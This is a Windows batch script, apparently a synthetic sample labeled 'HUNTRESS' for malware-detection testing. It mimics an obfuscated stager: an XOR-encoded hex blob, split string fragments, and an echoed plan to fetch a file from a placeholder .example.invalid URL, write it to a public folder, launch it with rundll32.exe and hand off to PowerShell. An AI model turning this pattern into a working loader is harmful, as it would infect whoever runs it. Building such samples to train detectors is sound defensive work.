@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:hex_pairs|reverse_xor

rem HUNTRESS-MATERIAL:0240431d570b57055704560103511e56545247400e56545247406c474b565d4f4752571d570b57055704560103511e56545247406f51527f40405641475d467b6f505a5f5146636f40415640666f09700e5b4752436c565f5a554f4752571d07070552555151571c575a5f52455d5a1d565f435e524b561d570b57055704560103511c1c09404347475b0e5f41464f570b57055704560103511e5d545a52435e52500e575a6c5d545a52435e52504f5f5f565b404156445c430e56545246545d525f6c474b565d4f565f545d5a400e5b435241544f070e475d465c506c56545247404f564b561d01005f5f575d46410e415647435257524f47435a4150406c55555c575d525b1f404056505c41436c5b50475243405a571f565f5a556c56475a41441f56475c5e56416c56415a464250520e40435647404f020e45

rem HUNTRESS-EXTENSION:cmd

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set FrAg0=v=1^|steps=acquire_remote,write_file,dispatch_process,handoff_script^|adapter=run
set FrAg1=dll32.exe^|stage_count=4^|graph=single^|next_language=powershell^|campaign_id=campa
set FrAg2=ign-b02e7d6d8d^|url=https://b02e7d6d8d.example.invalid/dbbfa644.dat^|file_path=C:
set FrAg3=\Users\Public\HuntressLab\stage-b02e7d6d8d.dat^|next_stage=stage-b02e7d6d8d.ps1

goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE

set "neutral_environment_probe=570f6461"

set "HUNTRESS_READY=1"
if defined HUNTRESS_READY set "ReCoVeReD=%FrAg0%%FrAg1%%FrAg2%%FrAg3%"

echo(!ReCoVeReD!

exit /b 0

:HUNTRESS_PLAN

echo rundll32.exe acquire, write, dispatch, and hand off stage-b02e7d6d8d.ps1

exit /b 0

